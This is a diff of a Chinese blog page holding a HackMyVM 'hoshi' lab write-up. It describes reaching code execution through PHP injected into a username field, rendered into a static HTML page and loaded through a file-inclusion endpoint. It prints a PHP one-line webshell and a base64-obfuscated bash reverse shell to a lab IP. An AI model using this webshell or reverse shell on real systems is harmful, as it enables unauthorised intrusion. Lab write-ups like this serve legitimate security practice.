@@ -26,26 +26,26 @@
 <meta property="og:site_name" content="Skyarrow&#39;s blog">
 <meta property="og:description" content="打完至少得歇一周的靶机。 信息收集 nmap： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172nmap -T4 -A -v 192.168.56.121Starting Nma">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/vmware_5BE3u5kmq1.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/vmware_LG5Xc5SpwO.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/PuzzleSolver_kfan52QR29.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_5BE3u5kmq1.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_LG5Xc5SpwO.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/PuzzleSolver_kfan52QR29.png">
 <meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/Photos_TQPw6GhFt9.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/vmware_kT0ZSMYB8Q.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/vmware_hSwbcCRkxD.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/vmware_yPKsnBA5LW-1750666012685-8.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/vmware_JDxrQxRWLD.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/msedge_5bddHb0PPo.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/vmware_V4E0u3mEwH.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/msedge_oiEEbjwEl8.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/msedge_6MnLSaXONg.png">
-<meta property="og:image" content="http://example.com/HackMyVM-hoshi/vmware_X1b3zx9rDv.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_kT0ZSMYB8Q.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_hSwbcCRkxD.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_yPKsnBA5LW-1750666012685-8.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_JDxrQxRWLD.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/msedge_5bddHb0PPo.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_V4E0u3mEwH.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/msedge_oiEEbjwEl8.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/msedge_6MnLSaXONg.png">
+<meta property="og:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_X1b3zx9rDv.png">
 <meta property="article:published_time" content="2025-06-23T06:54:48.000Z">
 <meta property="article:modified_time" content="2025-06-23T12:46:08.186Z">
 <meta property="article:author" content="Skyarrow">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="HVM">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/HackMyVM-hoshi/vmware_5BE3u5kmq1.png">
+<meta name="twitter:image" content="http://example.com/2025/06/23/HackMyVM-hoshi/vmware_5BE3u5kmq1.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -328,26 +328,26 @@
 <p>前期的信息收集大差不差，访问web页面。</p>
 <p>做的时候群里已经给出了两个提示：双图盲水印，admin.php的登录密码就在网页上无需爆破。</p>
 <p>先访问robots，得到该网站的logo和mazesec的logo有关联。</p>
-<p><img src="/HackMyVM-hoshi/vmware_5BE3u5kmq1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/vmware_5BE3u5kmq1.png" srcset="/img/loading.gif" lazyload></p>
 <p>用wget下载这里的logo和mazesec的logo，使用b神的puzzlesolver一把梭。</p>
-<p><img src="/HackMyVM-hoshi/vmware_LG5Xc5SpwO.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/HackMyVM-hoshi/PuzzleSolver_kfan52QR29.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/vmware_LG5Xc5SpwO.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/PuzzleSolver_kfan52QR29.png" srcset="/img/loading.gif" lazyload></p>
 <p>得到一个子目录hoshi&#x2F;。</p>
-<img src="/2025/06/23/HackMyVM-hoshi/Photos_TQPw6GhFt9.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;">
+<style>.cxfrllnwpsim{zoom: 50%;}</style><img src="/2025/06/23/HackMyVM-hoshi/Photos_TQPw6GhFt9.png" srcset="/img/loading.gif" lazyload class="cxfrllnwpsim">
 
 <p>访问hoshi&#x2F;，其中有一个gift.php，访问提示非法文件名，猜想可能有文件包含，不过暂时不知道有什么用。</p>
-<p><img src="/HackMyVM-hoshi/vmware_kT0ZSMYB8Q.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/vmware_kT0ZSMYB8Q.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr>
 <p>回到网站首页，底下有个用户反馈功能，结合上面的客服团队三日内解决我以为是有xss，但是试了半天没用，后来找作者要提示才知道没关系，就是普通的密码。</p>
-<p><img src="/HackMyVM-hoshi/vmware_hSwbcCRkxD.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/vmware_hSwbcCRkxD.png" srcset="/img/loading.gif" lazyload></p>
 <p>之后没辙了试了试电话号码，就是这个，进入管理员界面。</p>
 <p>进入之后发现有个文件上传目录，结合作者的提示，xss没用，那可能是直接写马进去，试了几次发现全给过滤了，因为它会把php的小于号和大于号转写成&amp;It;和&amp;gt;，即html编码。</p>
-<p><img src="/HackMyVM-hoshi/vmware_yPKsnBA5LW-1750666012685-8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/vmware_yPKsnBA5LW-1750666012685-8.png" srcset="/img/loading.gif" lazyload></p>
 <p>不过发现了用户名不会被转写，马上尝试在用户名中插入php代码。</p>
 <p>但把恶意构造的payload上传后在后台查看，发现代码没有被执行，而且我们的用户名也不见了，是不是也被过滤了呢，和之前的可能不是一种逻辑。（这里又硬控我大半个小时）</p>
-<p><img src="/HackMyVM-hoshi/vmware_JDxrQxRWLD.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/vmware_JDxrQxRWLD.png" srcset="/img/loading.gif" lazyload></p>
 <p>在一通东翻西找包括但不限于看完了info.php之后，终于想起来要看源码了，虽然php页面本身不可见，但至少可以看一看元素，其中有一句话说静态界面已生成。</p>
-<p><img src="/HackMyVM-hoshi/msedge_5bddHb0PPo.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/msedge_5bddHb0PPo.png" srcset="/img/loading.gif" lazyload></p>
 <p>这就能解释我们刚刚的疑问了，我们现在看到的admin.php根本不是真的php文件，而是刚刚那个登录界面跳转过来的不知道叫什么的htm或者html文件，所以我们注入的代码无法执行。</p>
 <p>dirsearch再扫一遍，这时发现了一个admin.html，访问和admin.php一模一样，就好像hexo的博客一样用框架生成静态的界面。</p>
 <p>很显然这就是真正代码嵌入的地方，那现在就差如何执行了。</p>
@@ -361,18 +361,18 @@
 <p>但是上传完恶意payload，然后不经过admin.php的中继直接去访问或者包含admin.html，会发现里面什么都没有。</p>
 <p>因为此时的html文件还没有被admin.php解析进去，所以这里的代码实际上是被正统html处理方式注释掉了，必须提前加载admin.php才行。（感谢sublarge大佬指正）</p>
 <p>我们先用phpinfo测试。</p>
-<p><img src="/HackMyVM-hoshi/vmware_V4E0u3mEwH.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/vmware_V4E0u3mEwH.png" srcset="/img/loading.gif" lazyload></p>
 <p>不出所料的被成功执行了。</p>
-<p><img src="/HackMyVM-hoshi/msedge_oiEEbjwEl8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/msedge_oiEEbjwEl8.png" srcset="/img/loading.gif" lazyload></p>
 <p>之后我们再传一句话木马尝试执行命令。（这里我不知道为什么system不能用了，换了shellexec才成功）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]); <span class="hljs-meta">?&gt;</span> <br>http:<span class="hljs-comment">//192.168.56.121/hoshi/gift.php?file=admin.html</span><br>a=whoami<br></code></pre></td></tr></table></figure>
 
 <p>执行成功。</p>
-<p><img src="/HackMyVM-hoshi/msedge_6MnLSaXONg.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/msedge_6MnLSaXONg.png" srcset="/img/loading.gif" lazyload></p>
 <p>之后反弹shell即可。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=<span class="hljs-built_in">printf</span> KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure>
 
-<p><img src="/HackMyVM-hoshi/vmware_X1b3zx9rDv.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/23/HackMyVM-hoshi/vmware_X1b3zx9rDv.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="GetUser"><a href="#GetUser" class="headerlink" title="GetUser"></a>GetUser</h3><hr>
 <p>user提权比拿到webshell要简单很多，先看home中的用户是welcome，得到提权目标，下一步仍然是老方法grep简单粗暴的遍历，不过没成。</p>
 <p>好在作者藏的不算特别隐蔽，到处乱翻找到一个shadow文件，应该是要爆破了。</p>
